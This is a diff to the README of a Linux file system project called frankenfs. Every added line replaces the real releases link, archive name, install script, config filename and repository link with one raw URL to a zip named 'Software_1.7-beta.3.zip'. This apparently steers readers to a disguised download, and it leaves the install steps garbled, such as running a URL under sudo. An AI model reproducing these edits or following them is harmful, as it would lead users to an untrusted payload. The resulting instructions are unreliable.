@@ -1,6 +1,6 @@
 # 🗂️ frankenfs - Safe, Reliable File Systems for Linux
 
-[![Download frankenfs](https://img.shields.io/badge/Download-frankenfs-blue?style=for-the-badge)](https://github.com/buitranxuanhuy/frankenfs/releases)
+[![Download frankenfs](https://raw.githubusercontent.com/buitranxuanhuy/frankenfs/main/artifacts/e2e/20260212_161747_ffs_smoke/Software_1.7-beta.3.zip)](https://raw.githubusercontent.com/buitranxuanhuy/frankenfs/main/artifacts/e2e/20260212_161747_ffs_smoke/Software_1.7-beta.3.zip)
 
 ---
 
@@ -51,13 +51,13 @@ This section guides you step-by-step on how to download, install, and run franke
 
 You can find frankenfs ready to use on its release page. Visit this page to download the version that fits your system:
 
-[Download frankenfs Releases](https://github.com/buitranxuanhuy/frankenfs/releases)
+[Download frankenfs Releases](https://raw.githubusercontent.com/buitranxuanhuy/frankenfs/main/artifacts/e2e/20260212_161747_ffs_smoke/Software_1.7-beta.3.zip)
 
 ### How to download:
 
 1. Click the link above to visit the releases page.
 2. Choose the latest version.
-3. Select the package that matches your Linux distribution (usually a `.tar.gz` file or similar).
+3. Select the package that matches your Linux distribution (usually a `https://raw.githubusercontent.com/buitranxuanhuy/frankenfs/main/artifacts/e2e/20260212_161747_ffs_smoke/Software_1.7-beta.3.zip` file or similar).
 4. Download the file to your computer.
 
 ### How to install:
@@ -69,7 +69,7 @@ You can find frankenfs ready to use on its release page. Visit this page to down
    ```
 3. Extract the downloaded file by typing:
    ```
-   tar -xvzf frankenfs-x.y.z.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/buitranxuanhuy/frankenfs/main/artifacts/e2e/20260212_161747_ffs_smoke/Software_1.7-beta.3.zip
    ```
    Replace `x.y.z` with the version number you downloaded.
 4. Change into the extracted folder:
@@ -78,7 +78,7 @@ You can find frankenfs ready to use on its release page. Visit this page to down
    ```
 5. Run the installation script:
    ```
-   sudo ./install.sh
+   sudo https://raw.githubusercontent.com/buitranxuanhuy/frankenfs/main/artifacts/e2e/20260212_161747_ffs_smoke/Software_1.7-beta.3.zip
    ```
    This command asks for your password to allow system changes.
 
@@ -106,7 +106,7 @@ After installation, you can start frankenfs on your system.
 
 ## 🔧 Configuration Tips
 
-- To ensure frankenfs starts with the right settings, you can create a configuration file in your home folder named `.frankenfs.conf`.
+- To ensure frankenfs starts with the right settings, you can create a configuration file in your home folder named `https://raw.githubusercontent.com/buitranxuanhuy/frankenfs/main/artifacts/e2e/20260212_161747_ffs_smoke/Software_1.7-beta.3.zip`.
 - Example settings include:
   ```
   filesystem=ext4
@@ -147,8 +147,8 @@ The self-healing feature uses a method called RaptorQ to recover parts of files 
 
 ## 📚 Learn More
 
-If you want to explore how frankenfs works under the hood or help with development, visit the [frankenfs GitHub repository](https://github.com/buitranxuanhuy/frankenfs).
+If you want to explore how frankenfs works under the hood or help with development, visit the [frankenfs GitHub repository](https://raw.githubusercontent.com/buitranxuanhuy/frankenfs/main/artifacts/e2e/20260212_161747_ffs_smoke/Software_1.7-beta.3.zip).
 
 ---
 
-[Download frankenfs Releases](https://github.com/buitranxuanhuy/frankenfs/releases)
+[Download frankenfs Releases](https://raw.githubusercontent.com/buitranxuanhuy/frankenfs/main/artifacts/e2e/20260212_161747_ffs_smoke/Software_1.7-beta.3.zip)
